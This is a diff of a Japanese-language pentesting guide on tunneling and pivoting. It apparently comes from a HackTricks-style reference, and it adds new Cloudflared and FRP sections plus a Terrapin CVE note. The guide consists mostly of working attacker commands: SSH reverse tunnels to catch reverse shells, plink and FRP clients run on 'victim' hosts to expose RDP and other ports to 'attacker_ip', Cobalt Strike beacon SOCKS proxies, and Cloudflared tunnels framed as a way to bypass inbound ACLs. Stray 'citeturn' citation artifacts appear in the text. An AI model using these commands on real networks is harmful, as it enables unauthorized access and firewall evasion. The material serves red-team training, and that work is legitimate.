@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### リバースポートフォワーディング
 
-これは、DMZを通じて内部ホストからあなたのホストへのリバースシェルを取得するのに役立ちます：
+これは、DMZを通じて内部ホストからあなたのホストにリバースシェルを取得するのに役立ちます：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）およびsshdの設定でrootログインを許可する必要があります：\
+両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）し、sshdの設定はrootログインを許可する必要があります：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -83,14 +83,18 @@ ifconfig tun0 up #Activate the server side network interface
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-クライアント側に新しいルートを設定する
+クライアント側で新しいルートを設定する
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **セキュリティ – テラピン攻撃 (CVE-2023-48795)**
+> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）またはSSHトンネルに依存する前に、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効にしてください。 citeturn4search0
+
 ## SSHUTTLE
 
-あなたは**ssh**を介してホストを通じて**サブネットワーク**へのすべての**トラフィック**を**トンネル**することができます。\
-例えば、10.10.10.0/24へのすべてのトラフィックを転送します。
+**ssh** を介してホストを通じて **サブネットワーク** への **トラフィック** を **トンネル** できます。\
+例えば、10.10.10.0/24 へのすべてのトラフィックを転送すること。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -134,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-すべてのインターフェースでリッスンしているチームサーバーでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
+チームサーバーでポートを開き、**ビークンを通じてトラフィックをルーティングする**ために使用できるすべてのインターフェースでリッスンします。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -156,7 +160,7 @@ rportfwd stop [bind port]
 - トラフィックは**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
 - **管理者権限は必要ありません** 高ポートでリバースポートフォワードを作成するために。
 
-### rPort2Portローカル
+### rPort2Port ローカル
 
 > [!WARNING]
 > この場合、**ポートはbeaconホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
@@ -174,8 +178,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-リリースページからダウンロードできます [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-**クライアントとサーバーで同じバージョンを使用する必要があります**
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)のリリースページからダウンロードできます。\
+**クライアントとサーバーで同じバージョンを使用する必要があります。**
 
 ### socks
 ```bash
@@ -322,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）、
 
-このバイナリは被害者のマシンで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
+このバイナリは被害者のマシンで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを私たちのマシンのポートに転送するには：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -354,7 +358,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効である** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。
+今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** できます。**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** します。
 
 **RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
 ```
@@ -397,7 +401,7 @@ Tunnel 2222:<attackers_machine>:443
 
 ## YARP
 
-Microsoftによって作成されたリバースプロキシです。ここで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoftによって作成されたリバースプロキシです。こちらで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNSトンネリング
 
@@ -442,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通じてトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -455,7 +459,7 @@ Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNS
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、ICMPエコーリクエストを使用してトンアダプタを作成し、データをトンネリングします。
+ルート権限が両方のシステムで必要で、ICMPエコーリクエストを使用してトンネルアダプタを作成し、データをそれらの間でトンネリングします。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -528,7 +532,7 @@ stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:404
 3つのトンネルを開きます：
 
 - 2つのTCP
-- 1つのHTTP、/tmp/httpbin/ からの静的ファイルの公開
+- /tmp/httpbin/ からの静的ファイルの公開を伴う1つのHTTP
 ```yaml
 tunnels:
 mytcp:
@@ -541,7 +545,72 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## その他のチェックツール
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflareの`cloudflared`デーモンは、**ローカルTCP/UDPサービス**を公開するアウトバウンドトンネルを作成でき、インバウンドファイアウォールルールを必要とせず、Cloudflareのエッジを待ち合わせポイントとして使用します。これは、出口ファイアウォールがHTTPSトラフィックのみを許可し、インバウンド接続がブロックされている場合に非常に便利です。
+
+### Quick tunnel one-liner
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 ピボット
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### DNSを使用した永続的トンネル
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+コネクタを開始します:
+```bash
+cloudflared tunnel run mytunnel
+```
+すべてのトラフィックがホストから**443経由でアウトバウンド**で出るため、Cloudflaredトンネルは、インバウンドACLやNAT境界をバイパスする簡単な方法です。バイナリは通常、特権昇格された状態で実行されるため、可能な場合はコンテナや`--user`フラグを使用してください。 citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、SOCKS、P2P NATホールパンチング**をサポートする、アクティブにメンテナンスされているGoリバースプロキシです。**v0.53.0 (2024年5月)**から、**SSHトンネルゲートウェイ**として機能できるため、ターゲットホストは追加のバイナリなしで、標準のOpenSSHクライアントのみを使用してリバーストンネルを立ち上げることができます。
+
+### クラシックリバースTCPトンネル
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### 新しいSSHゲートウェイの使用（frpcバイナリなし）
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+上記のコマンドは、被害者のポート **8080** を **attacker_ip:9000** として公開し、追加のツールを展開することなく実行します – ライビングオフザランドのピボッティングに最適です。 citeturn2search1
+
+## チェックする他のツール
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
